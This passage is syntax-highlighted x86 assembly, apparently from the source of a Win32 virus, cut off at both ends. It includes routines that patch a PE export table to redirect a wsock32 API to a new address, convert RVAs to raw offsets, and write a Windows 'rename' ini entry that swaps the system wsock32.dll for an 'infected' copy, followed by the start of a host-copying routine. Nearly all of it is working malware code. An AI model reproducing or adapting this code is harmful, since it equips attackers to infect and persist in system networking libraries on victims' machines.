        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AONindex</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; get next namepointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AONindex</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; in table (4 dwords)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                  

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA_TO_RAW</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OkTryAgain</span><span class="sc0">

    </span><span class="sc5">YesGotIt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressofordinals</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; ordinal = nameindex *</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; size of ordinal entry</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; + ordinal table base</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; offset of address</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">; of function = ordinal</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressoffunctions</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; * size of entry of</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; address table</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; get address</span><span class="sc0">

    </span><span class="sc5">SaveNewWsockApiAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">woldapiaddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; save it </span><span class="sc0">

    </span><span class="sc5">ChangeWsock</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wnewapiaddress</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; new api address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; set it</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">HOOK_API</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;===========================[ ic-rva_to_raw.inc ]===========================;</span><span class="sc0">

</span><span class="sc5">RVA_TO_RAW</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc1">; In:  edx - RVA to convert</span><span class="sc0">
    </span><span class="sc1">; Out: ecx - Pointer to RAW data or NULL if error</span><span class="sc0">

    </span><span class="sc5">GetRaw</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">; esi=offset peheader</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; ecx = nr. of sections</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20d</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; optional header size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0">                    </span><span class="sc1">; file header size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    

    </span><span class="sc5">FindCorrespondingSection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; rva we want into raw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; section RVA</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">08d</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; section size</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">SectionFound</span><span class="sc0">

    </span><span class="sc5">NotThisSection</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40d</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">FindCorrespondingSection</span><span class="sc0">

    </span><span class="sc5">EndRawSearch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">SectionFound</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">20d</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; pntr to section's raw</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; data from beginning </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; of file</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">RVA_TO_RAW</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;=========================[ ic-create_ini_file.inc ]========================;</span><span class="sc0">

</span><span class="sc5">CREATE_INI_FILE</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">IniGetSetWindowsDir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SET_WINDIR</span><span class="sc0">

    </span><span class="sc5">CreateInstallIni</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; template handle=0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                    </span><span class="sc1">; attributes=any file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                      </span><span class="sc1">; type= new file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; security option = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                      </span><span class="sc1">; shared for read</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">         </span><span class="sc1">; generic read write</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">inifile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; offset file name</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACreateFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">SetIniFilePointerToEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetFilePointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">writtensize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

    </span><span class="sc5">WriteInstallIniLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">inicrlf</span><span class="sc4">]</span><span class="sc0">            
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringSize</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rename</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; write 'rename'</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">writtensize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sysdir</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; write systemdir</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringSize</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">slashsign</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; write slash</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringSize</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc0">

    </span><span class="sc5">WriteWsock32Dll</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wsock32dll</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; write original dll</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringSize</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc0">

    </span><span class="sc5">WriteOn</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">equalsign</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; write original dll</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringSize</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sysdir</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; write systemdir</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringSize</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">slashsign</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; write slash</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringSize</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc0">

     </span><span class="sc5">WriteInfectedWsock</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wsock32inf</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; write original dll</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringSize</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CloseInstallIni</span><span class="sc0">

    </span><span class="sc5">StringSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">GotSize</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">StringSize</span><span class="sc0">

    </span><span class="sc5">GotSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">writtensize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 

    </span><span class="sc5">Write</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">writtenbytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">writtensize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AWriteFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">CloseInstallIni</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">inicrlf</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; write original dll</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringSize</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CREATE_INI_FILE</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;=========================[ ic-copy_host_file.inc ]=========================;</span><span class="sc0">

</span><span class="sc5">COPY_HOST_FILE</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">GetCurrentHostPath</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">currentdir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetModuleFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

